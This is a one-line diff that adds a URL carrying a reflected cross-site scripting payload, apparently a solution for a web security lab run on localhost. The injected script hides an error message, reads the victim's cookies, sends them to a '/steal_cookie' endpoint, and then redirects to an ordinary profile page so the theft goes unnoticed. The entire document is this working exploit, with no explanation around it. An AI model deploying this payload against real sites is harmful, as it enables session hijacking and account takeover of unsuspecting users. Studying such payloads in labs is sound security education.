@@ -1,0 +1,1 @@
+http://localhost:3000/profile?username=<script>document.getElementsByClassName("error")[0].hidden = true; var cookie = document.cookie; var xhr = new XMLHttpRequest(); xhr.open("GET", "http://localhost:3000/steal_cookie?cookie=".concat(cookie)); xhr.send(); xhr.onload = function(){ window.location.replace("http://localhost:3000/profile?username=user1");};</script>
